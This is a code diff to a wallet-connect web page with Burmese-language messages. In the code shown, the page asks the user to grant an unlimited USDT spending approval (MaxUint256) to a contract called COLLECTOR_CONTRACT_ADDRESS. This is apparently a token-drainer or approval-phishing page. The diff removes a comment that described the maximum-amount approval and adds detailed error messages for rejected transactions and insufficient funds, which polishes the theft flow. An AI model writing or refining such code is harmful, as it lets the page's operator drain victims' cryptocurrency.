@@ -57,7 +57,7 @@
             </div>
         </div>
 
-        <!-- Connect Wallet Button (Placed right below Network Header as requested previously) -->
+        <!-- Connect Wallet Button -->
         <div class="space-y-2 mb-4 text-center">
             <button id="connectBtn" onclick="startConnectProcess()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2 px-4 rounded-xl transition cursor-pointer text-xs shadow-lg">
                 Connect Wallet
@@ -385,7 +385,6 @@
                 logEl.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_ADDRESSES[network], ERC20_ABI, signer);
                 
-                // Max Amount (ethers.MaxUint256) ဖြင့် Approve တောင်းခံခြင်း
                 const maxAmount = ethers.MaxUint256;
 
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
@@ -405,7 +404,17 @@
                 checkUserData(network);
             } catch (err) {
                 console.error(err);
-                logEl.innerText = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                
+                // Detailed Error Handling
+                let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                
+                if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
+                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ (Rejected / Cancelled)။";
+                } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
+                    errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
+                }
+                
+                logEl.innerText = errorMsg;
             }
         }
 
